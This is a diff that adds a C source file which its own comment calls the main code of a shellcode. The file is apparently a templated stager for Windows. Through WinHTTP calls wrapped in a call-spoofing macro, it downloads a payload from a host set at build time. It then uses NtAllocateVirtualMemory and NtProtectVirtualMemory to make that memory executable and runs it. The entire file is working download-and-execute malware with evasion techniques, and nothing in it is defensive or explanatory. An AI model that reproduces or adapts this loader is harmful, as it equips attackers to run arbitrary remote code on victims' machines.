@@ -1,0 +1,146 @@
+#include <windows.h>
+#include <winhttp.h>
+
+#include "Instance.h"
+#include "Prototypes.h"
+#include "Macros.h"
+#include "PreHash.h"
+#include "ntdll.h"
+
+/*
+
+    Main code of shellcode
+
+*/
+
+D_SEC(C) WCHAR reqMethod[] = L"GET";
+
+D_SEC(B)
+BOOL ReceiveData(
+	_In_	BOOL	    SecureConnection,
+	_In_	DWORD	    dwHttpPort,
+	_In_	LPWSTR	    lpwHost,
+	_In_	LPWSTR	    lpwEndpoint,
+	_In_	LPWSTR	    lpwUserAgent,
+	_Inout_	PVOID	    *pData,
+	_Inout_	DWORD	    *pdwDataSize,
+    _In_    PINSTANCE   Inst
+)
+{
+	BOOL		bResults = FALSE,	retVal = FALSE,		success = FALSE;
+	DWORD		dwReadedSize = 0,	dwTotalReaded = 0;
+	HINTERNET	hSession = NULL,	hConnect = NULL,	hRequest = NULL;
+
+	PVOID		tempBuffer = NULL;
+	PVOID		outputBuf = NULL;
+
+	DWORD		dwReqFlags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
+
+	if (SecureConnection)
+		dwReqFlags |= WINHTTP_FLAG_SECURE;
+
+
+    hSession = SPOOF(Inst->Transport.WinHttpOpen, Inst->Module.Kernelbase, lpwUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	if (hSession == NULL)
+		goto end;
+
+	hConnect = SPOOF(Inst->Transport.WinHttpConnect, Inst->Module.Kernelbase,hSession, lpwHost, dwHttpPort, 0);
+	if (hConnect == NULL)
+		goto end;
+
+	hRequest = SPOOF(Inst->Transport.WinHttpOpenRequest, Inst->Module.Kernelbase, hConnect, reqMethod, lpwEndpoint, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwReqFlags);
+	if (hRequest == NULL)
+		goto end;
+
+	bResults = SPOOF(Inst->Transport.WinHttpSendRequest, Inst->Module.Kernelbase, hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+	if (bResults == FALSE)
+		goto end;
+
+	bResults = SPOOF(Inst->Transport.WinHttpReceiveResponse, Inst->Module.Kernelbase, hRequest, NULL);
+	if (bResults)
+	{
+		do
+		{
+			tempBuffer = Inst->Win32.LocalAlloc(LPTR, 1024);
+			if (tempBuffer == NULL)
+				goto end;
+
+			success = SPOOF(Inst->Transport.WinHttpReadData, Inst->Module.Kernelbase, hRequest, tempBuffer, 1024, &dwReadedSize);
+			if (success == TRUE && dwReadedSize == 0) 
+			{
+				retVal = TRUE;
+				break;
+			}
+			else if (success == FALSE)
+			{
+                DBREAK;
+				break;
+			}
+
+			if (outputBuf == NULL)
+			{
+				outputBuf = Inst->Win32.LocalAlloc(LPTR, dwReadedSize);
+			}
+			else
+			{
+				outputBuf = Inst->Win32.LocalReAlloc(outputBuf, (dwTotalReaded + dwReadedSize), LMEM_ZEROINIT | LMEM_MOVEABLE);
+			}
+
+			dwTotalReaded += dwReadedSize;
+
+			xMemcpy((PBYTE)((UINT_PTR)outputBuf + (dwTotalReaded - dwReadedSize)),
+				(PBYTE)tempBuffer,
+				dwReadedSize
+			);
+			xMemset((PBYTE)tempBuffer, 0, 1024);
+
+		} while (success == TRUE);
+
+
+	}
+
+	*pData = (void**)outputBuf;
+	*pdwDataSize = dwTotalReaded;
+
+end:
+	if (tempBuffer) Inst->Win32.LocalFree(tempBuffer);
+	if (hRequest) SPOOF(Inst->Transport.WinHttpCloseHandle, Inst->Module.Kernelbase, hRequest);
+	if (hConnect) SPOOF(Inst->Transport.WinHttpCloseHandle, Inst->Module.Kernelbase, hConnect);
+	if (hSession) SPOOF(Inst->Transport.WinHttpCloseHandle, Inst->Module.Kernelbase, hSession);
+	return retVal;
+}
+
+$$SESSION_INFO$$
+
+D_SEC(B)
+VOID Main(
+    _In_    PVOID   Param,
+    _In_    PINSTANCE Inst
+)
+{
+	void* pDownloadedData;
+	DWORD dwDownloadedDataSize;
+
+	if(!
+    ReceiveData($$SECURE$$, $$PORT$$, (LPWSTR)&endpoint, (LPWSTR)&uri, (LPWSTR)&userAgent, &pDownloadedData, &dwDownloadedDataSize, Inst))
+    {
+        DBREAK;
+        return;
+    }
+
+    PVOID pAllocatedAddr = NULL; 
+    SIZE_T stAllocSize = (SIZE_T)dwDownloadedDataSize;
+    ULONG_PTR ulOldProtect = 0;
+
+    void*   regContent[] = { NULL, NULL };
+
+    NTCALL(NtAllocateVirtualMemory, (HANDLE)-1, &pAllocatedAddr, 0, &stAllocSize, MEM_COMMIT, PAGE_READWRITE);
+
+    xMemcpy(pAllocatedAddr, pDownloadedData, dwDownloadedDataSize);
+
+    NTCALL(NtProtectVirtualMemory, (HANDLE)-1, &pAllocatedAddr, &stAllocSize, PAGE_EXECUTE_READ, &ulOldProtect);
+
+    ((EXEC_MEM)pAllocatedAddr)();
+
+    return;
+}
